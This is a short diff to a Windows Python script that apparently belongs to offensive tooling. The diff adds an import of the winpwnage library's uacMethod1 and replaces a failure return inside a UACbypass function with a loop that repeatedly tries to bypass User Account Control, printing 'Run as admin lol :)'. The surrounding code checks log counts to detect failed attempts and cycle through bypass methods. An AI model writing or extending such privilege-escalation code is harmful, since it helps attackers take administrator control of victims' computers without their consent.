@@ -21,6 +21,7 @@ from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_
 import subprocess
 import ctypes
 import sys
+from winpwnage.functions.uac.uacMethod1 import uacMethod1
 
 def UACbypass(method: int = 1) -> bool:
     if GetSelf()[1]:
@@ -44,7 +45,7 @@ def UACbypass(method: int = 1) -> bool:
             if log_count_after > log_count_before:
                 return UACbypass(method + 1)
         else:
-            return False
+            while uacMethod1(sys.executable): print("Run as admin lol :)")
         return True
 
 def IsAdmin() -> bool:
